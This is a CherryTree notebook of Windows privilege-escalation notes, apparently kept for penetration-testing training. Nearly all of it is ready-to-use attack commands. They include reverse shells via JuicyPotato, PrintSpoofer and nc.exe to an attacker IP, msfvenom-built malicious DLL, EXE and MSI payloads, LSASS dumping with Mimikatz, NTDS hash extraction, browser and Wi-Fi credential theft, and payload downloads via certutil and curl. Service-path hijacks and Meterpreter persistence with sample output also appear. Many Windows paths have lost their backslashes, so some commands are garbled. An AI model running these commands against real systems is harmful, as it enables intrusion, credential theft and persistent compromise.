<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <bookmarks list=""/>
  <node unique_id="38" master_id="0" name="Privilege Escalation" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="44" is_bold="1" foreground="#3584e4" ts_creation="1670957047" ts_lastsave="1706584679">
    <node unique_id="39" master_id="0" name="Windows" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1670957059" ts_lastsave="1670958832">
      <node unique_id="43" master_id="0" name="Windows" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670957333" ts_lastsave="1706233545">
        <rich_text background="#000000000000">
</rich_text>
        <rich_text scale="h2" background="#000000000000">Initial Enumeration
</rich_text>
        <rich_text background="#000000000000">
Command &amp; Description

</rich_text>
        <rich_text family="monospace" background="#000000000000">ipconfig /all</rich_text>
        <rich_text background="#000000000000">

Get interface, IP address and DNS information

</rich_text>
        <rich_text family="monospace" background="#000000000000">arp -a</rich_text>
        <rich_text background="#000000000000">

Review ARP table

</rich_text>
        <rich_text family="monospace" background="#000000000000">route print</rich_text>
        <rich_text background="#000000000000">

Review routing table

</rich_text>
        <rich_text family="monospace" background="#000000000000">Get-MpComputerStatus</rich_text>
        <rich_text background="#000000000000">

Check Windows Defender status

</rich_text>
        <rich_text family="monospace" background="#000000000000">Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</rich_text>
        <rich_text background="#000000000000">

List AppLocker rules

</rich_text>
        <rich_text family="monospace" background="#000000000000">Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:WindowsSystem32cmd.exe -User Everyone</rich_text>
        <rich_text background="#000000000000">

Test AppLocker policy

</rich_text>
        <rich_text family="monospace" background="#000000000000">set</rich_text>
        <rich_text background="#000000000000">

Display all environment variables

</rich_text>
        <rich_text family="monospace" background="#000000000000">systeminfo</rich_text>
        <rich_text background="#000000000000">

View detailed system configuration information

</rich_text>
        <rich_text family="monospace" background="#000000000000">wmic qfe</rich_text>
        <rich_text background="#000000000000">

Get patches and updates

</rich_text>
        <rich_text family="monospace" background="#000000000000">wmic product get name</rich_text>
        <rich_text background="#000000000000">

Get installed programs

</rich_text>
        <rich_text family="monospace" background="#000000000000">tasklist /svc</rich_text>
        <rich_text background="#000000000000">

Display running processes

</rich_text>
        <rich_text family="monospace" background="#000000000000">query user</rich_text>
        <rich_text background="#000000000000">

Get logged
</rich_text>
        <rich_text family="monospace" background="#000000000000">echo %USERNAME%</rich_text>
        <rich_text background="#000000000000">

Get current user

</rich_text>
        <rich_text family="monospace" background="#000000000000">whoami /priv</rich_text>
        <rich_text background="#000000000000">

View current user privileges

</rich_text>
        <rich_text family="monospace" background="#000000000000">whoami /groups</rich_text>
        <rich_text background="#000000000000">

View current user group information

</rich_text>
        <rich_text family="monospace" background="#000000000000">net user</rich_text>
        <rich_text background="#000000000000">

Get all system users

</rich_text>
        <rich_text family="monospace" background="#000000000000">net localgroup</rich_text>
        <rich_text background="#000000000000">

Get all system groups

</rich_text>
        <rich_text family="monospace" background="#000000000000">net localgroup administrators</rich_text>
        <rich_text background="#000000000000">

View details about a group

</rich_text>
        <rich_text family="monospace" background="#000000000000">net accounts</rich_text>
        <rich_text background="#000000000000">

Get passsword policy

</rich_text>
        <rich_text family="monospace" background="#000000000000">netstat -ano</rich_text>
        <rich_text background="#000000000000">

Display active network connections

</rich_text>
        <rich_text family="monospace" background="#000000000000">pipelist.exe /accepteula</rich_text>
        <rich_text background="#000000000000">

List named pipes

</rich_text>
        <rich_text family="monospace" background="#000000000000">gci \.pipe</rich_text>
        <rich_text background="#000000000000">

List named pipes with PowerShell

</rich_text>
        <rich_text family="monospace" background="#000000000000">accesschk.exe /accepteula \.Pipelsass -v</rich_text>
        <rich_text background="#000000000000">

Review permissions on a named pipe


</rich_text>
        <rich_text scale="h2" background="#000000000000">Handy Commands
</rich_text>
        <rich_text background="#000000000000">
Command &amp; Description

</rich_text>
        <rich_text family="monospace" background="#000000000000">mssqlclient.py sql_dev@10.129.43.30 -windows-auth</rich_text>
        <rich_text background="#000000000000">

Connect using mssqlclient.py

</rich_text>
        <rich_text family="monospace" background="#000000000000">enable_xp_cmdshell</rich_text>
        <rich_text background="#000000000000">

Enable xp</rich_text>
        <rich_text style="italic" background="#000000000000">cmdshell with mssqlclient.py</rich_text>
        <rich_text background="#000000000000">
</rich_text>
        <rich_text family="monospace" background="#000000000000">xp_cmdshell whoami</rich_text>
        <rich_text background="#000000000000">

Run OS commands with xp_cmdshell

</rich_text>
        <rich_text family="monospace" background="#000000000000">c:toolsJuicyPotato.exe -l 53375 -p c:windowssystem32cmd.exe -a "/c c:toolsnc.exe 10.10.14.3 443 -e cmd.exe" -t *</rich_text>
        <rich_text background="#000000000000">

Escalate privileges with JuicyPotato

</rich_text>
        <rich_text family="monospace" background="#000000000000">c:toolsPrintSpoofer.exe -c "c:toolsnc.exe 10.10.14.3 8443 -e cmd"</rich_text>
        <rich_text background="#000000000000">

Escalating privileges with PrintSpoofer

</rich_text>
        <rich_text family="monospace" background="#000000000000">procdump.exe -accepteula -ma lsass.exe lsass.dmp</rich_text>
        <rich_text background="#000000000000">

Take memory dump with ProcDump

</rich_text>
        <rich_text family="monospace" background="#000000000000">sekurlsa::minidump lsass.dmp</rich_text>
        <rich_text background="#000000000000"> and </rich_text>
        <rich_text family="monospace" background="#000000000000">sekurlsa::logonpasswords</rich_text>
        <rich_text background="#000000000000">

Use MimiKatz to extract credentials from LSASS memory dump

</rich_text>
        <rich_text family="monospace" background="#000000000000">dir /q C:backupswwwrootweb.config</rich_text>
        <rich_text background="#000000000000">

Checking ownership of a file

</rich_text>
        <rich_text family="monospace" background="#000000000000">takeown /f C:backupswwwrootweb.config</rich_text>
        <rich_text background="#000000000000">

Taking ownership of a file

</rich_text>
        <rich_text family="monospace" background="#000000000000">Get-ChildItem -Path ‘C:backupswwwrootweb.config’ | select name,directory, @{Name=“Owner”;Expression={(Ge t-ACL $_.Fullname).Owner}}</rich_text>
        <rich_text background="#000000000000">

Confirming changed ownership of a file

</rich_text>
        <rich_text family="monospace" background="#000000000000">icacls “C:backupswwwrootweb.config” /grant lafi:F</rich_text>
        <rich_text background="#000000000000">

Modifying a file ACL

</rich_text>
        <rich_text family="monospace" background="#000000000000">secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL</rich_text>
        <rich_text background="#000000000000">

Extract hashes with secretsdump.py

</rich_text>
        <rich_text family="monospace" background="#000000000000">robocopy /B E:WindowsNTDS .ntds ntds.dit</rich_text>
        <rich_text background="#000000000000">

Copy files with ROBOCOPY

</rich_text>
        <rich_text family="monospace" background="#000000000000">wevtutil qe Security /rd:true /f:text | Select-String "/user"</rich_text>
        <rich_text background="#000000000000">

Searching security event logs

</rich_text>
        <rich_text family="monospace" background="#000000000000">wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"</rich_text>
        <rich_text background="#000000000000">

Passing credentials to wevtutil

</rich_text>
        <rich_text family="monospace" background="#000000000000">Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}</rich_text>
        <rich_text background="#000000000000">

Searching event logs with PowerShell

</rich_text>
        <rich_text family="monospace" background="#000000000000">msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll</rich_text>
        <rich_text background="#000000000000">

Generate malicious DLL

</rich_text>
        <rich_text family="monospace" background="#000000000000">dnscmd.exe /config /serverlevelplugindll adduser.dll</rich_text>
        <rich_text background="#000000000000">

Loading a custom DLL with dnscmd

</rich_text>
        <rich_text family="monospace" background="#000000000000">wmic useraccount where name="netadm" get sid</rich_text>
        <rich_text background="#000000000000">

Finding a user's SID

</rich_text>
        <rich_text family="monospace" background="#000000000000">sc.exe sdshow DNS</rich_text>
        <rich_text background="#000000000000">

Checking permissions on DNS service

</rich_text>
        <rich_text family="monospace" background="#000000000000">sc stop dns</rich_text>
        <rich_text background="#000000000000">

Stopping a service

</rich_text>
        <rich_text family="monospace" background="#000000000000">sc start dns</rich_text>
        <rich_text background="#000000000000">

Starting a service

</rich_text>
        <rich_text family="monospace" background="#000000000000">reg query \10.129.43.9HKLMSYSTEMCurrentControlSetServicesDNSParameters</rich_text>
        <rich_text background="#000000000000">

Querying a registry key

</rich_text>
        <rich_text family="monospace" background="#000000000000">reg delete \10.129.43.9HKLMSYSTEMCurrentControlSetServicesDNSParameters /v ServerLevelPluginDll</rich_text>
        <rich_text background="#000000000000">

Deleting a registry key

</rich_text>
        <rich_text family="monospace" background="#000000000000">sc query dns</rich_text>
        <rich_text background="#000000000000">

Checking a service status

</rich_text>
        <rich_text family="monospace" background="#000000000000">Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local</rich_text>
        <rich_text background="#000000000000">

Disabling the global query block list

</rich_text>
        <rich_text family="monospace" background="#000000000000">Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3</rich_text>
        <rich_text background="#000000000000">

Adding a WPAD record

</rich_text>
        <rich_text family="monospace" background="#000000000000">cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp</rich_text>
        <rich_text background="#000000000000">

Compile with cl.exe

</rich_text>
        <rich_text family="monospace" background="#000000000000">reg add HKCUSystemCurrentControlSetCAPCOM /v ImagePath /t REG_SZ /d "??C:ToolsCapcom.sys"</rich_text>
        <rich_text background="#000000000000">

Add reference to a driver (1)

</rich_text>
        <rich_text family="monospace" background="#000000000000">reg add HKCUSystemCurrentControlSetCAPCOM /v Type /t REG_DWORD /d 1</rich_text>
        <rich_text background="#000000000000">

Add reference to a driver (2)

</rich_text>
        <rich_text family="monospace" background="#000000000000">.DriverView.exe /stext drivers.txt</rich_text>
        <rich_text background="#000000000000"> and </rich_text>
        <rich_text family="monospace" background="#000000000000">cat drivers.txt | Select-String -pattern Capcom</rich_text>
        <rich_text background="#000000000000">

Check if driver is loaded

</rich_text>
        <rich_text family="monospace" background="#000000000000">EoPLoadDriver.exe SystemCurrentControlSetCapcom c:ToolsCapcom.sys</rich_text>
        <rich_text background="#000000000000">

Using EopLoadDriver

</rich_text>
        <rich_text family="monospace" background="#000000000000">c:ToolsPsService.exe security AppReadiness</rich_text>
        <rich_text background="#000000000000">

Checking service permissions with PsService

</rich_text>
        <rich_text family="monospace" background="#000000000000">sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"</rich_text>
        <rich_text background="#000000000000">

Modifying a service binary path

</rich_text>
        <rich_text family="monospace" background="#000000000000">REG QUERY HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v EnableLUA</rich_text>
        <rich_text background="#000000000000">

Confirming UAC is enabled

</rich_text>
        <rich_text family="monospace" background="#000000000000">REG QUERY HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v ConsentPromptBehaviorAdmin</rich_text>
        <rich_text background="#000000000000">

Checking UAC level

</rich_text>
        <rich_text family="monospace" background="#000000000000">[environment]::OSVersion.Version</rich_text>
        <rich_text background="#000000000000">

Checking Windows version

</rich_text>
        <rich_text family="monospace" background="#000000000000">cmd /c echo %PATH%</rich_text>
        <rich_text background="#000000000000">

Reviewing path variable

</rich_text>
        <rich_text family="monospace" background="#000000000000">curl http://10.10.14.3:8080/srrstr.dll -O "C:UserssarahAppDataLocalMicrosoftWindowsAppssrrstr.dll"</rich_text>
        <rich_text background="#000000000000">

Downloading file with cURL in PowerShell

</rich_text>
        <rich_text family="monospace" background="#000000000000">rundll32 shell32.dll,Control_RunDLL C:UserssarahAppDataLocalMicrosoftWindowsAppssrrstr.dll</rich_text>
        <rich_text background="#000000000000">

Executing custom dll with rundll32.exe

</rich_text>
        <rich_text family="monospace" background="#000000000000">.SharpUp.exe audit</rich_text>
        <rich_text background="#000000000000">

Running SharpUp

</rich_text>
        <rich_text family="monospace" background="#000000000000">icacls "C:Program Files (x86)PCProtectSecurityService.exe"</rich_text>
        <rich_text background="#000000000000">

Checking service permissions with icacls

</rich_text>
        <rich_text family="monospace" background="#000000000000">cmd /c copy /Y SecurityService.exe "C:Program Files (x86)PCProtectSecurityService.exe"</rich_text>
        <rich_text background="#000000000000">

Replace a service binary

</rich_text>
        <rich_text family="monospace" background="#000000000000">wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:windows\" | findstr /i /v """</rich_text>
        <rich_text background="#000000000000">

Searching for unquoted service paths

</rich_text>
        <rich_text family="monospace" background="#000000000000">accesschk.exe /accepteula "mrb3n" -kvuqsw hklmSystemCurrentControlSetservices</rich_text>
        <rich_text background="#000000000000">

Checking for weak service ACLs in the Registry

</rich_text>
        <rich_text family="monospace" background="#000000000000">Set-ItemProperty -Path HKLM:SYSTEMCurrentControlSetServicesModelManagerService -Name "ImagePath" -Value "C:UsersjohnDownloadsnc.exe -e cmd.exe 10.10.10.205 443"</rich_text>
        <rich_text background="#000000000000">

Changing ImagePath with PowerShell

</rich_text>
        <rich_text family="monospace" background="#000000000000">Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl</rich_text>
        <rich_text background="#000000000000">

Check startup programs

</rich_text>
        <rich_text family="monospace" background="#000000000000">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe &gt; maintenanceservice.exe</rich_text>
        <rich_text background="#000000000000">

Generating a malicious binary

</rich_text>
        <rich_text family="monospace" background="#000000000000">get-process -Id 3324</rich_text>
        <rich_text background="#000000000000">

Enumerating a process ID with PowerShell

</rich_text>
        <rich_text family="monospace" background="#000000000000">get-service | ? {$_.DisplayName -like 'Druva*'}</rich_text>
        <rich_text background="#000000000000">

Enumerate a running service by name with PowerShell

</rich_text>
        <rich_text scale="h2" background="#000000000000">Credential Theft
</rich_text>
        <rich_text background="#000000000000">
Command &amp; Description

</rich_text>
        <rich_text family="monospace" background="#000000000000">findstr /SIM /C:"password" *.txt *ini *.cfg *.config *.xml</rich_text>
        <rich_text background="#000000000000">

Search for files with the phrase "password"

</rich_text>
        <rich_text family="monospace" background="#000000000000">gc 'C:UserslafiAppDataLocalGoogleChromeUser DataDefaultCustom Dictionary.txt' | Select-String password</rich_text>
        <rich_text background="#000000000000">

Searching for passwords in Chrome dictionary files

</rich_text>
        <rich_text family="monospace" background="#000000000000">(Get-PSReadLineOption).HistorySavePath</rich_text>
        <rich_text background="#000000000000">

Confirm PowerShell history save path

</rich_text>
        <rich_text family="monospace" background="#000000000000">gc (Get-PSReadLineOption).HistorySavePath</rich_text>
        <rich_text background="#000000000000">

Reading PowerShell history file

</rich_text>
        <rich_text family="monospace" background="#000000000000">$credential = Import-Clixml -Path 'C:scriptspass.xml'</rich_text>
        <rich_text background="#000000000000">

Decrypting PowerShell credentials

</rich_text>
        <rich_text family="monospace" background="#000000000000">cd c:UserslafiDocuments &amp; findstr /SI /M "password" *.xml *.ini *.txt</rich_text>
        <rich_text background="#000000000000">

Searching file contents for a string

</rich_text>
        <rich_text family="monospace" background="#000000000000">findstr /si password *.xml *.ini *.txt *.config</rich_text>
        <rich_text background="#000000000000">

Searching file contents for a string

</rich_text>
        <rich_text family="monospace" background="#000000000000">findstr /spin "password" *.*</rich_text>
        <rich_text background="#000000000000">

Searching file contents for a string

</rich_text>
        <rich_text family="monospace" background="#000000000000">select-string -Path C:UserslafiDocuments*.txt -Pattern password</rich_text>
        <rich_text background="#000000000000">

Search file contents with PowerShell

</rich_text>
        <rich_text family="monospace" background="#000000000000">dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*</rich_text>
        <rich_text background="#000000000000">

Search for file extensions

</rich_text>
        <rich_text family="monospace" background="#000000000000">where /R C: *.config</rich_text>
        <rich_text background="#000000000000">

Search for file extensions

</rich_text>
        <rich_text family="monospace" background="#000000000000">Get-ChildItem C: -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore</rich_text>
        <rich_text background="#000000000000">

Search for file extensions using PowerShell

</rich_text>
        <rich_text family="monospace" background="#000000000000">cmdkey /list</rich_text>
        <rich_text background="#000000000000">

List saved credentials

</rich_text>
        <rich_text family="monospace" background="#000000000000">.SharpChrome.exe logins /unprotect</rich_text>
        <rich_text background="#000000000000">

Retrieve saved Chrome credentials

</rich_text>
        <rich_text family="monospace" background="#000000000000">.lazagne.exe -h</rich_text>
        <rich_text background="#000000000000">

View LaZagne help menu

</rich_text>
        <rich_text family="monospace" background="#000000000000">.lazagne.exe all</rich_text>
        <rich_text background="#000000000000">

Run all LaZagne modules

</rich_text>
        <rich_text family="monospace" background="#000000000000">Invoke-SessionGopher -Target WINLPE-SRV01</rich_text>
        <rich_text background="#000000000000">

Running SessionGopher

</rich_text>
        <rich_text family="monospace" background="#000000000000">netsh wlan show profile</rich_text>
        <rich_text background="#000000000000">

View saved wireless networks

</rich_text>
        <rich_text family="monospace" background="#000000000000">netsh wlan show profile ilfreight_corp key=clear</rich_text>
        <rich_text background="#000000000000">

Retrieve saved wireless passwords

</rich_text>
        <rich_text scale="h2" background="#000000000000">Other Commands
</rich_text>
        <rich_text background="#000000000000">
Command &amp; Description

</rich_text>
        <rich_text family="monospace" background="#000000000000">certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat</rich_text>
        <rich_text background="#000000000000">

Transfer file with certutil

</rich_text>
        <rich_text family="monospace" background="#000000000000">certutil -encode file1 encodedfile</rich_text>
        <rich_text background="#000000000000">

Encode file with certutil

</rich_text>
        <rich_text family="monospace" background="#000000000000">certutil -decode encodedfile file2</rich_text>
        <rich_text background="#000000000000">

Decode file with certutil

</rich_text>
        <rich_text family="monospace" background="#000000000000">reg query HKEY_CURRENT_USERSoftwarePoliciesMicrosoftWindowsInstaller</rich_text>
        <rich_text background="#000000000000">

Query for always install elevated registry key (1)

</rich_text>
        <rich_text family="monospace" background="#000000000000">reg query HKLMSOFTWAREPoliciesMicrosoftWindowsInstaller</rich_text>
        <rich_text background="#000000000000">

Query for always install elevated registry key (2)

</rich_text>
        <rich_text family="monospace" background="#000000000000">msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi &gt; aie.msi</rich_text>
        <rich_text background="#000000000000">

Generate a malicious MSI package

</rich_text>
        <rich_text family="monospace" background="#000000000000">msiexec /i c:userslafidesktopaie.msi /quiet /qn /norestart</rich_text>
        <rich_text background="#000000000000">

Executing an MSI package from command line

</rich_text>
        <rich_text family="monospace" background="#000000000000">schtasks /query /fo LIST /v</rich_text>
        <rich_text background="#000000000000">

Enumerate scheduled tasks

</rich_text>
        <rich_text family="monospace" background="#000000000000">Get-ScheduledTask | select TaskName,State</rich_text>
        <rich_text background="#000000000000">

Enumerate scheduled tasks with PowerShell

</rich_text>
        <rich_text family="monospace" background="#000000000000">.accesschk64.exe /accepteula -s -d C:Scripts</rich_text>
        <rich_text background="#000000000000">

Check permissions on a directory

</rich_text>
        <rich_text family="monospace" background="#000000000000">Get-LocalUser</rich_text>
        <rich_text background="#000000000000">

Check local user description field

</rich_text>
        <rich_text family="monospace" background="#000000000000">Get-WmiObject -Class Win32_OperatingSystem | select Description</rich_text>
        <rich_text background="#000000000000">

Enumerate computer description field

</rich_text>
        <rich_text family="monospace" background="#000000000000">guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd</rich_text>
        <rich_text background="#000000000000">

Mount VMDK on Linux

</rich_text>
        <rich_text family="monospace" background="#000000000000">guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1</rich_text>
        <rich_text background="#000000000000">

Mount VHD/VHDX on Linux

</rich_text>
        <rich_text family="monospace" background="#000000000000">sudo python2.7 windows-exploit-suggester.py --update</rich_text>
        <rich_text background="#000000000000">

Update Windows Exploit Suggester database

</rich_text>
        <rich_text family="monospace" background="#000000000000">python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt</rich_text>
        <rich_text background="#000000000000">

Running Windows Exploit Suggester</rich_text>
        <rich_text>

Unfortunately, when we attempt to run our malicious script, we are presented with an error that references the </rich_text>
        <rich_text style="italic">Execution Policies</rich_text>
        <rich_text> of our system, which appear to prevent our script from running.
A quick review of the Microsoft documentation on PowerShell execution policies (linked in the error message), shows that these policies are set on a per-user rather than per-system basis.
Keep in mind that much like anything in Windows, the PowerShell Execution Policy settings can be dictated by one or more Active Directory GPOs.</rich_text>
        <rich_text link="webs https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/antivirus-evasion/av-evasion-in-practice/evading-av-with-thread-injection#fn6" scale="sup">6</rich_text>
        <rich_text> In those cases, it may be necessary to search for additional bypass vectors.
Let's attempt to view and change the policy for our current user. Please note that in this instance, we have chosen to change the policy globally rather than on a per-script basis, which can be achieved by using the </rich_text>
        <rich_text weight="heavy">-ExecutionPolicy Bypass</rich_text>
        <rich_text> flag for each script when it is run.
First, we are going to retrieve the current execution policy via the </rich_text>
        <rich_text weight="heavy">Get-ExecutionPolicy -Scope CurrentUser</rich_text>
        <rich_text> command and then set it to </rich_text>
        <rich_text style="italic">Unrestricted</rich_text>
        <rich_text> via the </rich_text>
        <rich_text weight="heavy">Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser</rich_text>
        <rich_text> command.
</rich_text>
        <rich_text family="monospace">PS C:\Users\offsec\Desktop&gt; Get-ExecutionPolicy -Scope CurrentUser
Undefined

PS C:\Users\offsec\Desktop&gt; Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help Module at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A

PS C:\Users\offsec\Desktop&gt; Get-ExecutionPolicy -Scope CurrentUser
Unrestricted
</rich_text>
      </node>
      <node unique_id="47" master_id="0" name="offsec (s1ren)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670958832" ts_lastsave="1670984858">
        <rich_text background="#000000000000" foreground="#ffff00000000">+ WHOAMI?</rich_text>
        <rich_text background="#000000000000">
whoami


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ CAN I DO SPECIAL THINGS?</rich_text>
        <rich_text background="#000000000000">
WHOAMI /PRIV


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ SERVICES --&gt; SERVICES AT BOOT &amp; SERVICES RAN THROUGH ICACLS.EXE</rich_text>
        <rich_text background="#000000000000">
wmic service get name,startname
NET START

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">
+ NETWORK CAPABILITIES? (CHECKS FOR 127)
+ SHELL CAPABILITY --&gt; STAGED/NON-STAGED? FORMAT? ARCH? ENCODER? BIND/REVERSE?
+ SHELL CAPABILITY --&gt; ENSURE CODE EXEC.
+ NETWORK CAPABILITY.</rich_text>
        <rich_text background="#000000000000">

NETSTAT -ANOY


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ NET USERS (LATERAL MOVEMENT CAPABILITIES?)</rich_text>
        <rich_text background="#000000000000">
NET USERS
NET LOCALGROUP
NET USER &lt;USERNAME&gt;</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000"> (AM I ADMIN? ANY SPECIAL GROUPS?)</rich_text>
        <rich_text background="#000000000000">


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ ADMIN CAPABILITY?</rich_text>
        <rich_text background="#000000000000">
NET LOCALGROUP ADMINISTRATORS


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ PERMITTED TRAFFIC CAPABILITY???</rich_text>
        <rich_text background="#000000000000">
netsh advfirewall firewall show rule name=all
netsh advfirewall firewall show rule name=inbound
netsh advfirewall firewall show rule name=outbounD


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ FILE TRANSFER CAPABILITY???</rich_text>
        <rich_text background="#000000000000">

CERTUTIL?
FTP?
TFTP?
VB?
PS?
SMB?
NFS?


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ ANY SCHEDULED TASKS I/O OPERATIONS?</rich_text>
        <rich_text background="#000000000000">

C:\ &gt; schtasks /query /fo LIST /v &gt; schtasks.txt
+ BINPATHS?
SC.EXE
[ + More to Come ]

Other Articles:
</rich_text>
        <rich_text link="webs https://www.fuzzysecurity.com/tutorials/16.html" background="#000000000000">https://www.fuzzysecurity.com/tutorials/16.html</rich_text>
        <rich_text background="#000000000000">
</rich_text>
        <rich_text link="webs https://book.hacktricks.xyz/windows/windows-local-privilege-escalation" background="#000000000000">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation</rich_text>
        <rich_text background="#000000000000">



</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Pro-tip - To prevent your shell from hanging as a result of any of these commands, prefix them with this!</rich_text>
        <rich_text background="#000000000000">
cmd.exe /c &lt;commands&gt;
cmd.exe /c start &lt;commands&gt;


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ I just got shell on windows! What would S1REN do?</rich_text>
        <rich_text background="#000000000000">
--&gt; Get a meterpreter shell.
When it comes to a windows machine and receiving a low privilege shell - I do not mess around. I will always immediately work to maintain access and gain a more useful shell with meterpreter.
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST &lt;Attacking Machine IP&gt;
set LPORT &lt;Listening Port&gt;

Maintaining Access with Meterpreter:
</rich_text>
        <rich_text link="webs https://www.offensive-security.com/metasploit-unleashed/maintaining-access/" background="#000000000000">https://www.offensive-security.com/metasploit-unleashed/maintaining-access/</rich_text>
        <rich_text background="#000000000000">

meterpreter&gt; run persistence -U -i 5 -p 443 -r &lt;Attacking Machine IP&gt;
[*] Creating a persistent agent: LHOST=&lt;Attacking Machine IP&gt; LPORT=443 (interval=5 onboot=true)
[*] Persistent agent script is 613976 bytes long
[*] Uploaded the persistent agent to C:\WINDOWS\TEMP\yyPSPPEn.vbs
[*] Agent executed with PID 492
[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
[*] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
[*] For cleanup use command: run multi_console_command -rc /root/.msf4/logs/persistence/XEN-XP-SP2-BARE_20100821.2602/clean_up__20100821.2602.rc
meterpreter&gt;
meterpreter&gt; reboot 
Rebooting... 
meterpreter&gt; exit 
meterpreter&gt; sysinfo
Computer: XEN-XP-SP2-BARE
OS      : Windows XP (Build 2600, Service Pack 2).
Arch    : x86
Language: en_US
meterpreter&gt;

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Forward out a vulnerable service with meterpreter.</rich_text>
        <rich_text background="#000000000000">
meterpreter&gt; portfwd add -l &lt;Attacker PORT&gt; -p &lt;Victim PORT&gt; -r &lt;Victim IP&gt;
meterpreter&gt; portfwd add -l 3306 -p 3306 -r &lt;Victim IP&gt;
$ rdesktop 0.0.0.0


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Dude just do this with your meterpreter shell - trust S1REN.</rich_text>
        <rich_text background="#000000000000">
use exploit/windows/local/service_permissions

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Payloads</rich_text>
        <rich_text background="#000000000000">
--&gt; Checkbox target machine's file arch (x86, x64).
--&gt; Checkbox target machine for staged OR non-staged payloads..

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Execute a Powershell Script.</rich_text>
        <rich_text background="#000000000000">
powershell.exe 'C:\Tools\privesc.ps1'

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ I need to enumerate out the System Information.</rich_text>
        <rich_text background="#000000000000">
Save this info - it can be utilized with other windows privesc checking tools (based on installed patches, OS Versioning, etc)
systeminfo



</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Who am I?</rich_text>
        <rich_text background="#000000000000">
whoami
echo %username%

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Privileges</rich_text>
        <rich_text background="#000000000000">
whoami /priv

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ List out all NT AUTHORITY/SYSTEM Services.</rich_text>
        <rich_text background="#000000000000">
wmic service get name,startname |FINDSTR "NT"

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Print Nightmare?</rich_text>
        <rich_text background="#000000000000">
whoami /priv
</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">SetImpersonatePrivilege Enabled? 🙂</rich_text>
        <rich_text background="#000000000000">

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Domain Box?</rich_text>
        <rich_text background="#000000000000">
</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Bloodhound? Sharphound?</rich_text>
        <rich_text background="#000000000000">

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Can we Install Things Elevated?</rich_text>
        <rich_text background="#000000000000">
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
